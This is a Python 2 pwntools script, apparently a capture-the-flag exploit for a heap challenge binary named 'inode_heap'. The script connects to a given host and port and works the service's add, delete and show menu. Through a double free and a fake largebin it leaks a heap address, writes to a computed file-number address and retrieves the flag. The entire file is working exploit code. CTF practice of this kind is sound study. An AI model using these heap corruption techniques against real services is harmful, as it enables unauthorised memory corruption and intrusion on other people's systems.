#!/usr/bin/python2.7
#coding:utf-8
# eg: python exp.py 192.168.8.101 8888 
from pwn import *
import struct
from sys import *
def add(f,Type,number=1):
	f.sendafter(">","1")
	f.sendafter(">",str(Type))
	f.sendafter("number",str(number))
def dele(f,Type):
	f.sendafter(">","2")
	f.sendafter(">",str(Type))
def show(f,Type):
	f.sendafter(">","3")
	f.sendafter(">",str(Type))
def getIO():
    return remote(host, port, timeout=timeout)
#f=process("./inode_heap",env={'LD_PRELOAD':'./libc.so.6'})
host = argv[1]
port = int(argv[2])
timeout = 30
#context.log_level = 'debug'

def get_flag():
    try:
        f=getIO()
	add(f,1)
	add(f,2)
	## get a double free pt
	dele(f,1)
	add(f,2)
	dele(f,1)
	##get a fake largebin
	for i in range(5):
		add(f,2)
	show(f,1)
	f.recvuntil("number :")
	heap_addr=int(f.recvline().strip(),10)
	success("heap_addr :%x"%heap_addr)
	dele(f,2)
	add(f,1,heap_addr)
	dele(f,2)
	add(f,1,heap_addr)

	add(f,2,heap_addr-0x10)
	add(f,2)
	add(f,2,0xb1)
	for i in range(7):
		dele(f,1)
		add(f,2)
	dele(f,1)
	show(f,1)
	f.recvuntil("number :")
	file_no_addr=int(f.recvline().strip(),10)-0x230
	add(f,2,file_no_addr)
	add(f,1)
	add(f,1,666)
	f.sendafter(">","4") #get flag
	f.recvuntil(" :")
	flag=f.recvuntil(" we have received").strip("we have received")
	return flag
    except Exception as err:
            return "please try again"
if __name__ == '__main__':
    success("flag is :"+get_flag())
